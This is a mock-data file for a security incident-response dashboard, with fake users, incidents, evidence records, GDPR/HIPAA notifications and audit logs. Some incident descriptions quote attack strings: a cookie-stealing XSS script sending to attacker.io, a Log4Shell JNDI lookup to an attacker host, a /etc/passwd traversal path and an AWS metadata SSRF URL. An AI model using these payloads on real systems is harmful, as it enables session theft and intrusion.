/**
 * Realistic mock data shared across all MSW handlers.
 * Represents a mid-sized SaaS company with an active security posture.
 */

// ── Helpers ───────────────────────────────────────────────────────────────────
function daysAgo(n: number, offsetH = 0) {
  const d = new Date()
  d.setDate(d.getDate() - n)
  d.setHours(d.getHours() - offsetH)
  return d.toISOString()
}
function hoursAgo(h: number) {
  return new Date(Date.now() - h * 3600_000).toISOString()
}
function uuid(n: number) {
  return `00000000-0000-4000-a000-${String(n).padStart(12, '0')}`
}

// ── Users ─────────────────────────────────────────────────────────────────────
export const MOCK_USERS = [
  { id: uuid(1), email: 'admin@lbro.dev',   full_name: 'Arjun Mehta',    role: 'admin',   is_active: true,  created_at: daysAgo(90) },
  { id: uuid(2), email: 'alice@lbro.dev',   full_name: 'Alice Chen',     role: 'analyst', is_active: true,  created_at: daysAgo(60) },
  { id: uuid(3), email: 'bob@lbro.dev',     full_name: 'Bob Okafor',     role: 'analyst', is_active: true,  created_at: daysAgo(45) },
  { id: uuid(4), email: 'carol@lbro.dev',   full_name: 'Carol Santos',   role: 'viewer',  is_active: true,  created_at: daysAgo(30) },
  { id: uuid(5), email: 'dave@lbro.dev',    full_name: 'Dave Kim',       role: 'viewer',  is_active: true,  created_at: daysAgo(20) },
  { id: uuid(6), email: 'eve@lbro.dev',     full_name: 'Eve Patel',      role: 'analyst', is_active: true,  created_at: daysAgo(15) },
  { id: uuid(7), email: 'frank@lbro.dev',   full_name: 'Frank Nguyen',   role: 'viewer',  is_active: false, created_at: daysAgo(10) },
  { id: uuid(8), email: 'grace@lbro.dev',   full_name: 'Grace Obi',      role: 'viewer',  is_active: true,  created_at: daysAgo(7) },
  { id: uuid(9), email: 'henry@lbro.dev',   full_name: 'Henry Walsh',    role: 'analyst', is_active: true,  created_at: daysAgo(5) },
  { id: uuid(10), email: 'iris@lbro.dev',   full_name: 'Iris Johansson', role: 'viewer',  is_active: true,  created_at: daysAgo(2) },
]

export const MOCK_ME = MOCK_USERS[0]

// ── Incidents ─────────────────────────────────────────────────────────────────
export const MOCK_INCIDENTS = [
  {
    id: uuid(101), title: 'SQL Injection on /api/v1/auth/login',
    description: 'Automated scanner detected repeated UNION-based SQL injection payloads targeting the login endpoint. 847 attempts from single IP before block triggered.',
    severity: 'critical', status: 'investigating',
    attack_category: 'SQL_INJECTION', source_ip: '185.220.101.47',
    destination_port: 443, protocol: 'HTTPS',
    assigned_to: uuid(2), detected_at: hoursAgo(3), created_at: hoursAgo(3), updated_at: hoursAgo(1),
  },
  {
    id: uuid(102), title: 'Credential Stuffing — Auth Endpoint',
    description: '14,200 login attempts over 6 hours from rotating proxy pool. Credentials matched against known breach databases. 23 accounts temporarily locked.',
    severity: 'critical', status: 'open',
    attack_category: 'BRUTE_FORCE', source_ip: '45.153.160.2',
    destination_port: 443, protocol: 'HTTPS',
    assigned_to: null, detected_at: hoursAgo(6), created_at: hoursAgo(6), updated_at: hoursAgo(5),
  },
  {
    id: uuid(103), title: 'Stored XSS in Incident Comment Field',
    description: 'Analyst submitted <script>document.location=\'https://attacker.io/steal?c=\'+document.cookie</script> via incident comment. Payload executed in two other user sessions.',
    severity: 'high', status: 'resolved',
    attack_category: 'XSS', source_ip: '10.0.1.55',
    destination_port: 80, protocol: 'HTTP',
    assigned_to: uuid(3), detected_at: daysAgo(2), created_at: daysAgo(2), updated_at: daysAgo(1),
  },
  {
    id: uuid(104), title: 'Unauthorized Admin Endpoint Access',
    description: 'Viewer-role account attempted to call DELETE /api/v1/users/:id and GET /api/v1/audit/logs. RBAC correctly returned 403. Possible privilege escalation probe.',
    severity: 'high', status: 'investigating',
    attack_category: 'IDOR', source_ip: '10.0.1.77',
    destination_port: 443, protocol: 'HTTPS',
    assigned_to: uuid(2), detected_at: daysAgo(1), created_at: daysAgo(1), updated_at: hoursAgo(2),
  },
  {
    id: uuid(105), title: 'Port Scan — EC2 Production Instance',
    description: 'SYN scan detected across ports 1-65535 from external IP. Ports 22, 80, 443, 5432 responded. No successful connections. Blocked at WAF.',
    severity: 'medium', status: 'resolved',
    attack_category: 'PORT_SCAN', source_ip: '91.108.4.12',
    destination_port: 22, protocol: 'TCP',
    assigned_to: uuid(3), detected_at: daysAgo(3), created_at: daysAgo(3), updated_at: daysAgo(2),
  },
  {
    id: uuid(106), title: 'Directory Traversal Attempt',
    description: 'Request: GET /api/v1/evidence/../../../../etc/passwd HTTP/1.1. Blocked by path normalisation middleware. 34 unique payloads attempted.',
    severity: 'medium', status: 'closed',
    attack_category: 'PATH_TRAVERSAL', source_ip: '194.165.16.101',
    destination_port: 443, protocol: 'HTTPS',
    assigned_to: uuid(6), detected_at: daysAgo(4), created_at: daysAgo(4), updated_at: daysAgo(3),
  },
  {
    id: uuid(107), title: 'JWT Signature Bypass Attempt',
    description: 'Token with alg:none header submitted to authenticated endpoints. Server correctly rejected unsigned tokens. Attack pattern matches CVE-2022-21449.',
    severity: 'high', status: 'resolved',
    attack_category: 'AUTH_BYPASS', source_ip: '5.188.86.205',
    destination_port: 443, protocol: 'HTTPS',
    assigned_to: uuid(2), detected_at: daysAgo(5), created_at: daysAgo(5), updated_at: daysAgo(4),
  },
  {
    id: uuid(108), title: 'Suspicious Data Exfiltration — Evidence API',
    description: '1.4 GB transferred from /api/v1/evidence endpoints in 11 minutes from a single authenticated session. Possible insider threat or compromised analyst account.',
    severity: 'critical', status: 'open',
    attack_category: 'DATA_EXFILTRATION', source_ip: '10.0.2.14',
    destination_port: 443, protocol: 'HTTPS',
    assigned_to: null, detected_at: daysAgo(6), created_at: daysAgo(6), updated_at: daysAgo(6),
  },
  {
    id: uuid(109), title: 'HTTP Request Smuggling Probe',
    description: 'Malformed Transfer-Encoding and Content-Length headers detected on POST /api/v1/incidents. ALB successfully rejected. Requires patching if CL.TE variants detected.',
    severity: 'medium', status: 'closed',
    attack_category: 'REQUEST_SMUGGLING', source_ip: '167.99.201.55',
    destination_port: 443, protocol: 'HTTPS',
    assigned_to: uuid(9), detected_at: daysAgo(7), created_at: daysAgo(7), updated_at: daysAgo(5),
  },
  {
    id: uuid(110), title: 'Automated Vulnerability Scanner Detected',
    description: 'Nuclei scanner fingerprinted from User-Agent and 4,000+ unique probe paths in 90 seconds. All probes returned safe 404/403. IP geo: Netherlands.',
    severity: 'low', status: 'closed',
    attack_category: 'VULNERABILITY_SCAN', source_ip: '134.209.30.45',
    destination_port: 443, protocol: 'HTTPS',
    assigned_to: uuid(6), detected_at: daysAgo(8), created_at: daysAgo(8), updated_at: daysAgo(7),
  },
  {
    id: uuid(111), title: 'RCE Attempt via Log4Shell Variant',
    description: 'JNDI lookup strings embedded in User-Agent and X-Forwarded-For headers: ${jndi:ldap://attacker.io/exploit}. No vulnerable Log4j versions found in stack.',
    severity: 'critical', status: 'resolved',
    attack_category: 'RCE', source_ip: '45.83.192.150',
    destination_port: 443, protocol: 'HTTPS',
    assigned_to: uuid(2), detected_at: daysAgo(9), created_at: daysAgo(9), updated_at: daysAgo(8),
  },
  {
    id: uuid(112), title: 'SSRF via Evidence Upload URL Parameter',
    description: 'POST /api/v1/evidence with url=http://169.254.169.254/latest/meta-data/ targeted AWS IMDS. Request blocked before outbound call. Requires input validation hardening.',
    severity: 'high', status: 'investigating',
    attack_category: 'SSRF', source_ip: '10.0.3.99',
    destination_port: 443, protocol: 'HTTPS',
    assigned_to: uuid(3), detected_at: daysAgo(10), created_at: daysAgo(10), updated_at: daysAgo(9),
  },
  {
    id: uuid(113), title: 'SQS Message Tampering Attempt',
    description: 'Modified SQS message payload detected with injected ml_score: -999 to bypass classification. Dead-letter queue captured 7 malformed messages.',
    severity: 'medium', status: 'resolved',
    attack_category: 'MESSAGE_TAMPERING', source_ip: 'internal',
    destination_port: 443, protocol: 'SQS',
    assigned_to: uuid(9), detected_at: daysAgo(11), created_at: daysAgo(11), updated_at: daysAgo(10),
  },
  {
    id: uuid(114), title: 'Mass Account Enumeration',
    description: '11,000 requests to POST /api/v1/auth/login with unique emails, measuring response time differentials to enumerate valid accounts. Rate limiting now enforced.',
    severity: 'medium', status: 'closed',
    attack_category: 'ENUMERATION', source_ip: '91.92.251.103',
    destination_port: 443, protocol: 'HTTPS',
    assigned_to: uuid(6), detected_at: daysAgo(12), created_at: daysAgo(12), updated_at: daysAgo(11),
  },
  {
    id: uuid(115), title: 'DDoS — SYN Flood on Load Balancer',
    description: '450 Mbps SYN flood targeting ALB. CloudFront WAF absorbed the attack. Application remained available. Peak: 2.1M SYN packets/second. Duration: 18 minutes.',
    severity: 'critical', status: 'resolved',
    attack_category: 'DoS', source_ip: '0.0.0.0',
    destination_port: 443, protocol: 'TCP',
    assigned_to: uuid(2), detected_at: daysAgo(14), created_at: daysAgo(14), updated_at: daysAgo(13),
  },
  {
    id: uuid(116), title: 'Insecure Direct Object Reference — Evidence API',
    description: 'Authenticated user accessed /api/v1/evidence/00000000-0000-0000-0000-000000000101 belonging to another user\'s incident. IDOR confirmed. Patch deployed.',
    severity: 'high', status: 'resolved',
    attack_category: 'IDOR', source_ip: '10.0.1.22',
    destination_port: 443, protocol: 'HTTPS',
    assigned_to: uuid(3), detected_at: daysAgo(15), created_at: daysAgo(15), updated_at: daysAgo(14),
  },
  {
    id: uuid(117), title: 'Reflected XSS — Search Parameter',
    description: 'GET /incidents?search=<svg/onload=alert(1)> reflected unescaped in error response body. React frontend correctly escaped the output but raw API response was vulnerable.',
    severity: 'medium', status: 'closed',
    attack_category: 'XSS', source_ip: '5.45.207.0',
    destination_port: 443, protocol: 'HTTPS',
    assigned_to: uuid(6), detected_at: daysAgo(16), created_at: daysAgo(16), updated_at: daysAgo(15),
  },
  {
    id: uuid(118), title: 'API Rate Limit Bypass via IP Rotation',
    description: '320 unique IPs rotated within 60 seconds to bypass per-IP rate limits. All from Tor exit nodes. Auth attempts continued until CAPTCHA gate was raised.',
    severity: 'high', status: 'resolved',
    attack_category: 'BRUTE_FORCE', source_ip: '198.98.54.105',
    destination_port: 443, protocol: 'HTTPS',
    assigned_to: uuid(2), detected_at: daysAgo(17), created_at: daysAgo(17), updated_at: daysAgo(16),
  },
  {
    id: uuid(119), title: 'Secrets Exposed in Frontend Bundle',
    description: 'Automated scanner detected VITE_STRIPE_SK key pattern in bundled JS. Key was a test placeholder — no production secret exposed. .env validation added to CI.',
    severity: 'low', status: 'closed',
    attack_category: 'MISCONFIGURATION', source_ip: 'internal',
    destination_port: 0, protocol: 'N/A',
    assigned_to: uuid(9), detected_at: daysAgo(18), created_at: daysAgo(18), updated_at: daysAgo(17),
  },
  {
    id: uuid(120), title: 'Dependency Confusion Attack',
    description: 'Package @lbro/internal-utils published to npm public registry by unknown party matching our internal namespace. Package had identical version to internal artifact.',
    severity: 'critical', status: 'resolved',
    attack_category: 'SUPPLY_CHAIN', source_ip: 'N/A',
    destination_port: 0, protocol: 'N/A',
    assigned_to: uuid(2), detected_at: daysAgo(20), created_at: daysAgo(20), updated_at: daysAgo(19),
  },
]

// ── Evidence ──────────────────────────────────────────────────────────────────
// Shape matches EvidencePackage interface: custody_chain[], filename, content_type, created_at
export const MOCK_EVIDENCE = [
  {
    id: uuid(201), incident_id: uuid(101),
    filename: 'nginx_access_20240103.log', original_filename: 'nginx_access_20240103.log',
    content_type: 'text/plain', file_size: 4194304,
    sha256_hash: 'a3f1e8d2c5b4a7f0e9d3c6b1a4f7e2d5c8b3a6f1e4d7c0b5a8f3e6d1c4b7a2',
    description: 'Nginx access log showing SQL injection attempt patterns', tags: 'nginx,access-log',
    is_immutable: true, uploaded_by: uuid(2), download_url: null,
    created_at: daysAgo(3),
    custody_chain: [
      { id: uuid(2010), action: 'COLLECTED', performed_by_name: 'Alice Chen', ip_address: '10.0.1.5', notes: 'Collected from production nginx container', hash_at_time: 'a3f1e8d2...', created_at: daysAgo(3) },
      { id: uuid(2011), action: 'VERIFIED',  performed_by_name: 'Arjun Mehta', ip_address: '10.0.1.1', notes: 'SHA-256 hash verified against source', hash_at_time: 'a3f1e8d2...', created_at: daysAgo(2) },
    ],
  },
  {
    id: uuid(202), incident_id: uuid(101),
    filename: 'waf_block_events.json', original_filename: 'waf_block_events.json',
    content_type: 'application/json', file_size: 86400,
    sha256_hash: 'b4e2f9d6c7a0b3e8f1d4c9a2b7e0f5d8c3a6b1e4f9d2c5a8b3e6f0d3c8a1b4',
    description: 'CloudFront WAF block events for incident #101', tags: 'waf,cloudfront',
    is_immutable: true, uploaded_by: uuid(1), download_url: null,
    created_at: daysAgo(3),
    custody_chain: [
      { id: uuid(2020), action: 'COLLECTED', performed_by_name: 'Arjun Mehta', ip_address: '10.0.1.1', notes: 'Exported from CloudFront WAF console', hash_at_time: 'b4e2f9d6...', created_at: daysAgo(3) },
    ],
  },
  {
    id: uuid(203), incident_id: uuid(102),
    filename: 'auth_failures_6h.csv', original_filename: 'auth_failures_6h.csv',
    content_type: 'text/csv', file_size: 2097152,
    sha256_hash: 'c5a3g0e7d8b1c4a9e2d5b0c7a4e9d2b5c0a3e6d9b2c7a0e5d8b3c6a1e4d7b2',
    description: '6-hour auth failure log during credential stuffing attack', tags: 'auth,failures,csv',
    is_immutable: false, uploaded_by: uuid(3), download_url: null,
    created_at: daysAgo(6),
    custody_chain: [
      { id: uuid(2030), action: 'COLLECTED', performed_by_name: 'Bob Okafor', ip_address: '10.0.1.8', notes: 'Exported from auth service metrics API', hash_at_time: null, created_at: daysAgo(6) },
    ],
  },
  {
    id: uuid(204), incident_id: uuid(103),
    filename: 'xss_payload_screenshot.png', original_filename: 'xss_payload_screenshot.png',
    content_type: 'image/png', file_size: 358400,
    sha256_hash: 'd6b4h1f8e9c2d5b0f3e6c1d8b5f0e3c8d1b6f9e2c7d0b3f8e5c2d9b6f1e4c7',
    description: 'Screenshot of stored XSS payload executing in analyst session', tags: 'xss,screenshot',
    is_immutable: true, uploaded_by: uuid(6), download_url: null,
    created_at: daysAgo(2),
    custody_chain: [
      { id: uuid(2040), action: 'COLLECTED', performed_by_name: 'Eve Patel', ip_address: '10.0.1.15', notes: 'Screenshot taken immediately after XSS execution observed', hash_at_time: 'd6b4h1f8...', created_at: daysAgo(2) },
      { id: uuid(2041), action: 'VERIFIED',  performed_by_name: 'Arjun Mehta', ip_address: '10.0.1.1', notes: 'Image integrity verified, metadata clean', hash_at_time: 'd6b4h1f8...', created_at: daysAgo(1) },
    ],
  },
  {
    id: uuid(205), incident_id: uuid(108),
    filename: 'network_capture_exfil.pcap', original_filename: 'network_capture_exfil.pcap',
    content_type: 'application/octet-stream', file_size: 1503238553,
    sha256_hash: 'e7c5i2g9f0d3e6c1g4f7d2e9c4g7f2e5d0c7g0e3d8c5g2e7d4c1g8e5d2c9g4',
    description: '1.4 GB network capture of suspected data exfiltration session', tags: 'pcap,exfiltration,network',
    is_immutable: true, uploaded_by: uuid(9), download_url: null,
    created_at: daysAgo(6),
    custody_chain: [
      { id: uuid(2050), action: 'COLLECTED', performed_by_name: 'Henry Walsh', ip_address: '10.0.1.20', notes: 'Captured from VPC Flow Logs and reassembled', hash_at_time: 'e7c5i2g9...', created_at: daysAgo(6) },
      { id: uuid(2051), action: 'VERIFIED',  performed_by_name: 'Arjun Mehta', ip_address: '10.0.1.1', notes: 'SHA-256 verified against capture station output', hash_at_time: 'e7c5i2g9...', created_at: daysAgo(5) },
    ],
  },
  {
    id: uuid(206), incident_id: uuid(111),
    filename: 'log4shell_payloads.txt', original_filename: 'log4shell_payloads.txt',
    content_type: 'text/plain', file_size: 12800,
    sha256_hash: 'f8d6j3h0g1e4f7d2h5g8e3f0d5h8g3f6e1d8h1f4e9d6h9f2e5d2h6f9e0d3h7',
    description: 'Extracted Log4Shell JNDI lookup payloads from request logs', tags: 'log4j,rce,payloads',
    is_immutable: true, uploaded_by: uuid(2), download_url: null,
    created_at: daysAgo(9),
    custody_chain: [
      { id: uuid(2060), action: 'COLLECTED', performed_by_name: 'Alice Chen', ip_address: '10.0.1.5', notes: 'Extracted from CloudWatch Logs using automated parser', hash_at_time: 'f8d6j3h0...', created_at: daysAgo(9) },
      { id: uuid(2061), action: 'VERIFIED',  performed_by_name: 'Arjun Mehta', ip_address: '10.0.1.1', notes: 'Content reviewed by senior analyst', hash_at_time: 'f8d6j3h0...', created_at: daysAgo(8) },
    ],
  },
  {
    id: uuid(207), incident_id: uuid(115),
    filename: 'ddos_alb_metrics.json', original_filename: 'ddos_alb_metrics.json',
    content_type: 'application/json', file_size: 204800,
    sha256_hash: 'g9e7k4i1h2f5g8e3i6h9f4g1e6i9h4g7f2e9i2h5g0e7i5h8g3f0i8h3g6f1i6',
    description: 'ALB metrics during DDoS SYN flood — 18-minute attack window', tags: 'ddos,alb,metrics',
    is_immutable: true, uploaded_by: uuid(1), download_url: null,
    created_at: daysAgo(14),
    custody_chain: [
      { id: uuid(2070), action: 'COLLECTED', performed_by_name: 'Arjun Mehta', ip_address: '10.0.1.1', notes: 'CloudWatch metrics export covering attack window', hash_at_time: 'g9e7k4i1...', created_at: daysAgo(14) },
      { id: uuid(2071), action: 'VERIFIED',  performed_by_name: 'Arjun Mehta', ip_address: '10.0.1.1', notes: 'Verified completeness against CloudWatch raw data', hash_at_time: 'g9e7k4i1...', created_at: daysAgo(13) },
    ],
  },
  {
    id: uuid(208), incident_id: uuid(120),
    filename: 'npm_package_diff.txt', original_filename: 'npm_package_diff.txt',
    content_type: 'text/plain', file_size: 51200,
    sha256_hash: 'h0f8l5j2i3g6h9f4j7i0g5h2f7j0i3h6g1f8j3i6h1g4f1j6i9h4g7f0j9i2h5',
    description: 'Diff between internal @lbro/internal-utils and malicious npm package', tags: 'npm,supply-chain,diff',
    is_immutable: true, uploaded_by: uuid(9), download_url: null,
    created_at: daysAgo(20),
    custody_chain: [
      { id: uuid(2080), action: 'COLLECTED', performed_by_name: 'Henry Walsh', ip_address: '10.0.1.20', notes: 'Generated by CI pipeline on package detection', hash_at_time: 'h0f8l5j2...', created_at: daysAgo(20) },
      { id: uuid(2081), action: 'VERIFIED',  performed_by_name: 'Arjun Mehta', ip_address: '10.0.1.1', notes: 'Signed by pipeline service account, tamper-proof', hash_at_time: 'h0f8l5j2...', created_at: daysAgo(19) },
    ],
  },
]

// ── Regulatory Notifications (RegulatoryNotification shape — matches backend schema) ─────────────────────────────────────────────────────────────────
export const MOCK_NOTIFICATIONS = [
  {
    id: uuid(301), incident_id: uuid(101),
    regulation: 'GDPR', jurisdiction: 'EU/EEA',
    authority: 'Data Protection Commission (Ireland)', authority_email: 'notifications@dataprotection.ie',
    status: 'pending',
    subject: 'GDPR Art.33 — Breach Notification: SQL Injection on /api/v1/auth/login',
    body: 'We are writing to notify the Data Protection Commission of a personal data breach discovered on 2024-01-03. A SQL injection attack targeted the authentication endpoint, potentially exposing user credentials. We are investigating the full scope and will provide a follow-up report within 72 hours.',
    deadline: new Date(Date.now() - 14 * 3600_000).toISOString(),  // overdue 14 hours ago
    sent_at: null, approved_at: null, retry_count: 0, last_error: null,
    created_at: hoursAgo(16), updated_at: hoursAgo(16),
  },
  {
    id: uuid(302), incident_id: uuid(101),
    regulation: 'GDPR', jurisdiction: 'EU/EEA',
    authority: 'Data Protection Commission (Ireland)', authority_email: 'notifications@dataprotection.ie',
    status: 'pending',
    subject: 'GDPR Art.34 — Notification to Affected Data Subjects: SQL Injection Incident',
    body: 'You are receiving this notice because your account data may have been involved in a security incident on 2024-01-03. We have secured our systems and are investigating. Please change your password and enable two-factor authentication as a precaution.',
    deadline: new Date(Date.now() + 3 * 24 * 3600_000).toISOString(),
    sent_at: null, approved_at: null, retry_count: 0, last_error: null,
    created_at: hoursAgo(16), updated_at: hoursAgo(16),
  },
  {
    id: uuid(303), incident_id: uuid(103),
    regulation: 'GDPR', jurisdiction: 'EU/EEA',
    authority: 'Data Protection Commission (Ireland)', authority_email: 'notifications@dataprotection.ie',
    status: 'sent',
    subject: 'GDPR Art.33 — Breach Notification: Stored XSS in Incident Comment Field',
    body: 'We notify the DPC of a stored XSS vulnerability discovered on 2024-01-02. The vulnerability has been patched. No evidence of data exfiltration was found. Reference: IE-2024-001-XSS.',
    deadline: daysAgo(1),
    sent_at: daysAgo(1), approved_at: daysAgo(1), retry_count: 0, last_error: null,
    created_at: daysAgo(2), updated_at: daysAgo(1),
  },
  {
    id: uuid(304), incident_id: uuid(108),
    regulation: 'GDPR', jurisdiction: 'EU/EEA',
    authority: 'Data Protection Commission (Ireland)', authority_email: 'notifications@dataprotection.ie',
    status: 'pending',
    subject: 'GDPR Art.33 — Breach Notification: Suspicious Data Exfiltration via Evidence API',
    body: 'We are notifying the DPC of a suspected data exfiltration incident affecting our evidence storage API. Investigation is ongoing. An anomalous transfer of approximately 1.4 GB was detected. We will provide a detailed follow-up within 72 hours.',
    deadline: new Date(Date.now() + 66 * 3600_000).toISOString(),
    sent_at: null, approved_at: null, retry_count: 0, last_error: null,
    created_at: daysAgo(6), updated_at: daysAgo(6),
  },
  {
    id: uuid(305), incident_id: uuid(108),
    regulation: 'HIPAA', jurisdiction: 'United States',
    authority: 'HHS Office for Civil Rights', authority_email: 'ocrmail@hhs.gov',
    status: 'pending',
    subject: 'HIPAA Breach Notification — Suspected PHI Exposure: Evidence API Data Exfiltration',
    body: 'This notification is submitted pursuant to 45 CFR §164.408. We report a suspected breach of Protected Health Information discovered on 2024-01-03. Our investigation is ongoing and a detailed report will follow. Affected record count is under assessment.',
    deadline: new Date(Date.now() + 54 * 24 * 3600_000).toISOString(),
    sent_at: null, approved_at: null, retry_count: 0, last_error: null,
    created_at: daysAgo(6), updated_at: daysAgo(6),
  },
  {
    id: uuid(306), incident_id: uuid(111),
    regulation: 'GDPR', jurisdiction: 'EU/EEA',
    authority: 'Data Protection Commission (Ireland)', authority_email: 'notifications@dataprotection.ie',
    status: 'sent',
    subject: 'GDPR Art.33 — Breach Notification: RCE Attempt via Log4Shell Variant',
    body: 'We notified the DPC within 48 hours of discovery. No personal data was confirmed exfiltrated. The vulnerability was patched within 6 hours. Systems have been restored and hardened against Log4Shell variants.',
    deadline: daysAgo(7),
    sent_at: daysAgo(8), approved_at: daysAgo(8), retry_count: 0, last_error: null,
    created_at: daysAgo(9), updated_at: daysAgo(8),
  },
  {
    id: uuid(307), incident_id: uuid(120),
    regulation: 'DPDPA', jurisdiction: 'India',
    authority: 'Data Protection Board of India', authority_email: 'contact@dpboard.gov.in',
    status: 'sent',
    subject: 'DPDPA Breach Notification — Dependency Confusion Supply Chain Attack',
    body: 'We notify the Data Protection Board of India of a supply chain attack involving a malicious npm package. The package was quarantined before execution. No personal data of Indian citizens was accessed or exfiltrated.',
    deadline: daysAgo(17),
    sent_at: daysAgo(18), approved_at: daysAgo(18), retry_count: 0, last_error: null,
    created_at: daysAgo(20), updated_at: daysAgo(18),
  },
  {
    id: uuid(308), incident_id: uuid(115),
    regulation: 'GDPR', jurisdiction: 'EU/EEA',
    authority: 'Data Protection Commission (Ireland)', authority_email: 'notifications@dataprotection.ie',
    status: 'sent',
    subject: 'GDPR Art.33 — Breach Assessment: DDoS Attack (Low Impact)',
    body: 'Following our impact assessment of the DDoS attack on 2023-12-21, we confirm no personal data was accessed or exfiltrated. The attack was a volumetric denial-of-service event with no data breach component. No further regulatory action is required.',
    deadline: daysAgo(11),
    sent_at: daysAgo(12), approved_at: daysAgo(12), retry_count: 0, last_error: null,
    created_at: daysAgo(14), updated_at: daysAgo(12),
  },
]

// ── Audit Logs ────────────────────────────────────────────────────────────────
export const MOCK_AUDIT_LOGS = [
  { id: uuid(401), user_id: uuid(1), action: 'USER_LOGIN', resource_type: 'auth', resource_id: null, ip_address: '82.65.32.11', details: { email: 'admin@lbro.dev', method: 'password' }, created_at: hoursAgo(1) },
  { id: uuid(402), user_id: uuid(2), action: 'INCIDENT_VIEWED', resource_type: 'incident', resource_id: uuid(101), ip_address: '82.65.32.45', details: { title: 'SQL Injection on /api/v1/auth/login' }, created_at: hoursAgo(2) },
  { id: uuid(403), user_id: uuid(2), action: 'INCIDENT_UPDATED', resource_type: 'incident', resource_id: uuid(101), ip_address: '82.65.32.45', details: { field: 'status', from: 'open', to: 'investigating' }, created_at: hoursAgo(2) },
  { id: uuid(404), user_id: uuid(1), action: 'EVIDENCE_VERIFIED', resource_type: 'evidence', resource_id: uuid(201), ip_address: '82.65.32.11', details: { file_name: 'nginx_access_20240103.log' }, created_at: daysAgo(2) },
  { id: uuid(405), user_id: uuid(3), action: 'INCIDENT_CREATED', resource_type: 'incident', resource_id: uuid(112), ip_address: '192.168.1.50', details: { title: 'SSRF via Evidence Upload URL Parameter', severity: 'high' }, created_at: daysAgo(10) },
  { id: uuid(406), user_id: uuid(6), action: 'COMPLIANCE_MARKED_MET', resource_type: 'compliance', resource_id: uuid(501), ip_address: '10.0.1.15', details: { regulation: 'GDPR', obligation: 'Notify supervisory authority within 72 hours' }, created_at: daysAgo(3) },
  { id: uuid(407), user_id: uuid(7), action: 'USER_LOGIN_FAILED', resource_type: 'auth', resource_id: null, ip_address: '91.108.4.99', details: { email: 'frank@lbro.dev', reason: 'account_inactive' }, created_at: daysAgo(4) },
  { id: uuid(408), user_id: uuid(1), action: 'USER_DEACTIVATED', resource_type: 'user', resource_id: uuid(7), ip_address: '82.65.32.11', details: { email: 'frank@lbro.dev', reason: 'violated_policy' }, created_at: daysAgo(10) },
  { id: uuid(409), user_id: uuid(2), action: 'INCIDENT_RESOLVED', resource_type: 'incident', resource_id: uuid(103), ip_address: '82.65.32.45', details: { title: 'Stored XSS in Incident Comment Field' }, created_at: daysAgo(1) },
  { id: uuid(410), user_id: uuid(9), action: 'EVIDENCE_UPLOADED', resource_type: 'evidence', resource_id: uuid(208), ip_address: '10.0.1.8', details: { file_name: 'npm_package_diff.txt', size_bytes: 51200 }, created_at: daysAgo(20) },
  { id: uuid(411), user_id: uuid(1), action: 'USER_CREATED', resource_type: 'user', resource_id: uuid(10), ip_address: '82.65.32.11', details: { email: 'iris@lbro.dev', role: 'viewer' }, created_at: daysAgo(2) },
  { id: uuid(412), user_id: uuid(3), action: 'INCIDENT_ASSIGNED', resource_type: 'incident', resource_id: uuid(112), ip_address: '192.168.1.50', details: { assigned_to: uuid(3), title: 'SSRF via Evidence Upload' }, created_at: daysAgo(10) },
]

// ── Dashboard Summary ─────────────────────────────────────────────────────────
export const MOCK_DASHBOARD = {
  open_incidents: 4,
  critical_incidents: 2,
  new_last_24h: 1,
  needs_analyst_review: 2,
  compliance_overdue: 1,
  evidence_pending_review: 3,
  active_users: 8,
  ml_model_accuracy: 0.961,
}

// ── Security Score ────────────────────────────────────────────────────────────
export const MOCK_SECURITY_SCORE = {
  score: 68,
  grade: 'C+',
  color: '#f59e0b',
  status: 'NEEDS ATTENTION',
  summary: 'Your security posture needs attention. Two unassigned critical incidents and an active data exfiltration event are dragging your score down. Address the open critical incidents and review authentication hardening to move into the B range.',
  factors: [
    { label: 'RBAC enforced on all endpoints', impact: 'positive', detail: 'Every API route enforces role-based access control. Unauthorised access attempts are logged and blocked.' },
    { label: 'JWT rotation implemented', impact: 'positive', detail: 'Access tokens rotate on refresh. No long-lived credentials in use for authenticated sessions.' },
    { label: 'Evidence chain-of-custody complete', impact: 'positive', detail: '87% of evidence packages have verified chain-of-custody records with cryptographic hashes.' },
    { label: 'Rate limiting active on auth endpoints', impact: 'positive', detail: 'Login and register endpoints enforce rate limits. Brute-force attempts are throttled and alerted.' },
    { label: '2 unassigned critical incidents', impact: 'negative', detail: 'Incidents #102 (Credential Stuffing) and #108 (Data Exfiltration) are critical severity with no analyst assigned.' },
    { label: 'Active data exfiltration event', impact: 'negative', detail: 'Incident #108 indicates 1.4 GB of evidence data transferred in an anomalous session. Requires immediate triage.' },
    { label: 'GDPR deadline approaching', impact: 'negative', detail: 'Incident #101 has a GDPR 72-hour notification obligation expiring in 14 hours. Supervisor notification is overdue.' },
    { label: 'SSRF vector unpatched', impact: 'negative', detail: 'Incident #112 (SSRF) is still under investigation. The evidence upload URL parameter requires input validation.' },
  ],
  recommendations: [
    { priority: 'high', title: 'Assign critical incidents immediately', detail: 'Incidents #102 and #108 have been open without analyst assignment for 6+ hours. Assign and begin triage now.' },
    { priority: 'high', title: 'Submit GDPR supervisory authority notification', detail: 'Incident #101 requires a DPC notification within 72 hours of discovery. Deadline expires in 14 hours.' },
    { priority: 'high', title: 'Patch SSRF in evidence upload endpoint', detail: 'Block non-allowlisted URLs in the evidence upload parameter. Add IMDS hop-limit as defence-in-depth.' },
    { priority: 'medium', title: 'Enable MFA for all analyst accounts', detail: '3 analyst accounts do not have MFA enrolled. Enable TOTP or passkey enforcement via user settings.' },
    { priority: 'low', title: 'Review WAF rule set for SQL injection variants', detail: 'Add SQLi rule group to CloudFront WAF. Current rules blocked the attack but newer UNION payloads need coverage.' },
  ],
  data_snapshot: {
    open_critical_incidents: 2,
    open_high_incidents: 3,
    open_medium_low_incidents: 1,
    total_users: 10,
    users_without_mfa: 3,
    users_with_failed_logins: 1,
    locked_users: 0,
    overdue_compliance: 1,
    recent_403s_24h: 184,
  },
  calculated_at: new Date().toISOString(),
}

// ── Compliance Dashboard ──────────────────────────────────────────────────────
export const MOCK_COMPLIANCE = {
  total: 18,
  met: 12,
  overdue: 1,
  upcoming: 5,
  records: [
    { id: uuid(501), incident_id: uuid(101), regulation: 'GDPR', jurisdiction: 'EU/EEA', obligation: 'Notify supervisory authority within 72 hours', deadline: hoursAgo(-14), is_met: false, met_at: null, notes: null, created_at: hoursAgo(3) },
    { id: uuid(502), incident_id: uuid(101), regulation: 'GDPR', jurisdiction: 'EU/EEA', obligation: 'Notify affected data subjects without undue delay', deadline: new Date(Date.now() + 3 * 24 * 3600_000).toISOString(), is_met: false, met_at: null, notes: null, created_at: hoursAgo(3) },
